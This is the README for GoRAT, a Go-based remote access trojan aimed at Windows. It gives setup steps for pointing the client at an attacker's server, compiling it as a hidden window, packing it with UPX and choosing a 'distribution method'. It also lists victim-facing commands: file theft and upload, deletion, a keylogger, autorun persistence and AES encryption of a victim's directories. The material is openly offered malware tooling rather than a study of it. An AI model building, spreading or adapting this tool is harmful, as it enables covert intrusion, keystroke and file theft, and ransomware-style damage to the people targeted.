## GoRAT 1.2.2
⚙️🗡️GoRAT is a powerful remote access trojan for windows 7, 8 and 10 operating systems with many features


![alt text](prew.jpg)

Hi, this is RAT for the Windows operating system version 7, 8 and 10.
The server part can be run on any operating system where Golang is installed.

## Install
1. Clone this repository.
2. go to the client directory and change the IP parameter to the public IP of the computer where the server file will be launched.
You can also use 127.0.0.1 to test PAT on one computer specify the public ip address of the computer where the server.go file will be launched;
you can also change the PORT in client.go and server.go to the same one.
3. install mingw follow the instructions: http://www.mingw.org/wiki/HOWTO_Install_the_MinGW_GCC_Compiler_Suite
4. Install libraries for colours using command:

   go get github.com/fatih/color

   go get github.com/TheTitanrain/w32

   go get github.com/ProtonMail/go-autostart

 5. On the Windows operating system, you need to compile the client.go and kelogger.go file with the command: go build -ldflags -H=windowsgui .
 6. If you wish, you can compress the finished exe file with the upx packer and come up with a distribution method, but you yourself will decide.

## GoRAT features
[Autorun]

|   command   |                                     description                                    |
| ----------- |:-----------------------------------------------------------------------------------|
|     pwd     |  find out current directory                                                        |
|     ls      |  look at some directory                                                            |
|     rm      |  delete a file                                                                     |
|    rmdir    |  delete a directory                                                                |
|    file     |  download file from victim up to 65 kb                                             |
|  ifconfig   |  network information                                                               |
|   upfile    |  upload file to victim up to to 65 kb                                              |
|   sysinfo   |  all system information                                                            |
|  keylogger  |  activate keylogger                                                                |
|   crypt     |  encryption using AES. you have two options for encryption: encryption of one file |
|             |  or directory, if you choose to encrypt a directory, all files in it will be       |
|             |  encrypted, but internal directories will not be decrypted                         |


## Donate

    monero:
    48TmwHGVsqSKgD7giTALoK7P2muKLTJn5R8s5XtKZL1jEr4MJFBAwczVtofuFGvzsT1CzTcFXotwZCDno1UsskqFFZe9wVC
***
    bitcoin:
    18LKUKWAUBAFKzLBdFFkt687vh8rMPhL1u
***
    ethereum:
    0x189a9436b2fbBd0b1C3927E8a398379DBb7105AA
